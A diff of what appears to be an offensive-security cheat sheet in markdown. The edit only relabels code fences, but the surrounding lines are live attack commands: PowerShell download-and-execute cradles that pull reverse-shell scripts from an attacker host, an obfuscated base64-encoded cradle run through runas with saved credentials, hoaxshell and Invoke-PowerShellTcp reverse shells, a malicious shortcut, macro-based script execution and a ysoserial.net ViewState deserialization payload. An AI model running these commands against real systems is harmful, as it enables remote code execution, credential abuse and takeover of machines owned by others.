@@ -88,7 +88,7 @@
 
 ### Quick PowerShell Command Line Example
 
-```console
+```cmd
 PS C:\> $WScript = New-Object -COM WScript.shell
 PS C:\> $SC = $WScript.CreateShortcut('C:\PATH\TO\DIRECTORY\<FILE>.lnk')
 PS C:\> $SC.TargetPath = "C:\temp\<FILE>.exe"
@@ -123,7 +123,7 @@ $shortcut.Save()
 
 ### Hide Target Folder
 
-```console
+```cmd
 C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
 ```
 
@@ -378,7 +378,7 @@ $ python3 hoaxshell.py -s <LHOST> -p <LPORT>
 $ echo -n "IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/revshell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
 ```
 
-```console
+```cmd
 C:\> runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADkAOgA4ADAALwByAGUAdgBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
 ```
 
@@ -752,7 +752,7 @@ tail -3 Invoke-PowerShellTcp.ps1
 Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
 ```
 
-```console
+```cmd
 C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
 ```
 
@@ -1077,7 +1077,7 @@ Create `AutoOpen()` and `DocumentOpen()` functions to execute the `malicious scr
 
 ## Windows Scripting Host (WSH)
 
-```console
+```cmd
 C:\> wscript <FILE>.vbs
 C:\> cscript <FILE>.vbs
 C:\> wscript /e:VBScript C:\<FILE>.txt
@@ -1198,7 +1198,7 @@ $ ./shell.sh <RHOST> <RPORT>
 
 ## ysoserial.net
 
-```console
+```cmd
 PS C:\> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
 ```
 
